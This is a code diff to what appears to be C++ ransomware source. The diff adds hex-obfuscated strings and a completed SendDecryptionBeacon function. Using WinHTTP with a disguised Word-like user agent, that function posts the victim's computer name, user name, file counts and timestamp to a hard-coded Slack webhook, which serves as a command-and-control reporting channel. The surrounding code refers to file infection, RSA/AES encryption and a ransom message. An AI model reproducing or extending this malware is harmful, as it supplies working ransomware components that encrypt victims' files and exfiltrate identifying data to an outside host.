@@ -89,12 +89,15 @@ std::string strSlackUrl = "6705936676a754a45734657566f42793b483053794a5b615f2753
 std::string strHttpHeaderJson = "e6c527c5e6f637a6f2e6f69647163696c607071602a356079747d247e65647e6f634"; // "Content-type: application/json\r\n"
 //std::string strSlackPostMsg = ""; // "{ \"text\":\"New Infection!"  // not using at this time
 std::string strSlackNewInfection = "12e6f69647365666e694027756e422a322478756472202b7"; // "{ \"text\":\"New Infection!"
+std::string strSlackCleanInfection = "e6f602e6f69647365666e6940276e696e61656c63422a322478756472202b7"; // "{ \"text\":\"Cleaning Infection on";
 std::string strSlackComputer = "02a32756475707d6f63402"; // " Computer: "
 std::string strSlackUser = "02a32756375502b3"; // "; User: "
 std::string strSlackFilesInfected = "02a3465647365666e694023756c6966402b3"; // "; Files Infected: "
+std::string strSlackFilesDecrypted = "02a3465647079727365644023756c6966402b3"; // "; Files Decrypted: ";
 std::string strSlackTimestamp = "02a307d616473756d6964502b3"; // "; Timestamp: "
 std::string strSlackPostMsgEnd = "d70222"; // "\" }"
 std::string strCryptoProvider = "2756469667f627050236968607162776f64707972734023554140246e6160214352502465636e61686e654024766f637f6273696d4"; // "Microsoft Enhanced RSA and AES Cryptographic Provider"
+
 
 // Function Declarations
 DWORD FindFiles();
@@ -321,9 +324,11 @@ void DecodeStrings()
 	HexToString(strSlackUrl, strSlackUrl);
 	HexToString(strHttpHeaderJson, strHttpHeaderJson);
 	HexToString(strSlackNewInfection, strSlackNewInfection);
+	HexToString(strSlackCleanInfection, strSlackCleanInfection);
 	HexToString(strSlackComputer, strSlackComputer);
 	HexToString(strSlackUser, strSlackUser);
 	HexToString(strSlackFilesInfected, strSlackFilesInfected);
+	HexToString(strSlackFilesDecrypted, strSlackFilesDecrypted);
 	HexToString(strSlackTimestamp, strSlackTimestamp);
 	HexToString(strSlackPostMsgEnd, strSlackPostMsgEnd);
 }
@@ -498,7 +503,133 @@ void SendDecryptionBeacon(DWORD dwDecryptedFileCount)
 	https://hooks.slack.com/services/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
 	*/
 
+	bool fSuccess = false;
+	HINTERNET hSession = NULL;
+	HINTERNET hConnect = NULL;
+	HINTERNET hRequest = NULL;
 
+	// Use WinHttpOpen to obtain a HTTP session handle
+	std::wstring useragent_w = std::wstring(strUserAgent.begin(), strUserAgent.end());
+	LPCWSTR userAgent = useragent_w.c_str();
+
+	hSession = WinHttpOpen(
+		userAgent, //L"WinWord64/1.0",
+		WINHTTP_ACCESS_TYPE_NO_PROXY,
+		WINHTTP_NO_PROXY_NAME,
+		WINHTTP_NO_PROXY_BYPASS,
+		0);
+
+	// Connect to the beacon HTTP server
+	if (hSession)
+	{
+		std::wstring host_w = std::wstring(strSlackHost.begin(), strSlackHost.end());
+		LPCWSTR hostSlackApp = host_w.c_str();
+
+		hConnect = WinHttpConnect(
+			hSession,
+			hostSlackApp, //L"hooks.slack.com",
+			INTERNET_DEFAULT_HTTPS_PORT,
+			0);
+	}
+
+
+	// Create an HTTP Open Request handle
+	if (hConnect)
+	{
+		//std::cout << "Connected..." << std::endl;
+
+		std::wstring post_w = std::wstring(strHttpPost.begin(), strHttpPost.end());
+		LPCWSTR postMethod = post_w.c_str();
+
+		std::wstring url_w = std::wstring(strSlackUrl.begin(), strSlackUrl.end());
+		LPCWSTR urlSlackApp = url_w.c_str();
+
+		hRequest = WinHttpOpenRequest(
+			hConnect,
+			postMethod, //L"POST",
+			urlSlackApp, //L"/services/TJJ5KPZ7Y/BJMEN5NSW/QkZIsP8K9rOfWVCuJEzgf9Pv",
+			NULL, WINHTTP_NO_REFERER,
+			WINHTTP_DEFAULT_ACCEPT_TYPES,
+			WINHTTP_FLAG_SECURE);
+	}
+
+	//
+	// Prepare POST request headers and data
+	//
+	std::string jsonheader = strHttpHeaderJson; // "Content-type: application/json\r\n";
+	std::wstring jsonheader_w = std::wstring(jsonheader.begin(), jsonheader.end());
+	LPCWSTR headers = jsonheader_w.c_str();
+	DWORD headersLength = -1;
+
+	std::string postData = strSlackCleanInfection; // "{ \"text\":\"Cleaning Infection on";
+	std::string computerName = GetLocalComputerName();
+	postData.append(strSlackComputer); // (" Computer: ");
+	postData.append(computerName);
+
+	std::string userName = GetCurrentUser();
+	postData.append(strSlackUser); // ("; User: ");
+	postData.append(userName);
+
+	postData.append(strSlackFilesDecrypted); // ("; Files Decrypted: ");
+	postData.append(std::to_string(dwDecryptedFileCount));
+
+	std::string timestamp = GetUtcTime();
+	postData.append(strSlackTimestamp); // ("; Timestamp: ");
+	postData.append(timestamp);
+
+	postData.append(strSlackPostMsgEnd); // ("\" }");
+
+
+	// Send the WinHttp POST request
+	if (hRequest)
+	{
+#ifdef TRACEOUTPUT
+		if (g_Verbosity)
+		{
+			std::cout << "Sending decryption beacon message: " << postData << std::endl;
+		}
+#endif
+
+		fSuccess = WinHttpSendRequest(
+			hRequest,
+			headers,
+			headersLength,
+			(void*)postData.c_str(),
+			static_cast<unsigned long>(postData.length()),
+			static_cast<unsigned long>(postData.length()),
+			0);
+	}
+
+	// Check for errors
+	if (!fSuccess)
+	{
+		DWORD dwStatus;
+		dwStatus = GetLastError();
+
+		LPVOID lpMsgBuf;
+		FormatMessage(
+			FORMAT_MESSAGE_ALLOCATE_BUFFER |
+			FORMAT_MESSAGE_FROM_SYSTEM |
+			FORMAT_MESSAGE_IGNORE_INSERTS,
+			NULL,
+			dwStatus,
+			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+			(LPTSTR)& lpMsgBuf,
+			0, NULL);
+
+#ifdef TRACEOUTPUT
+		if (g_Verbosity)
+		{
+			std::cout << "SendDecryptionBeacon status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+			std::wcout << "SendDecryptionBeacon error:  " << (LPTSTR)lpMsgBuf;
+		}
+#endif
+	}
+
+	// Close open handles.
+	if (hRequest) WinHttpCloseHandle(hRequest);
+	if (hConnect) WinHttpCloseHandle(hConnect);
+	if (hSession) WinHttpCloseHandle(hSession);
 }
 
 void RansomMessage(DWORD dwEncryptedFileCount)
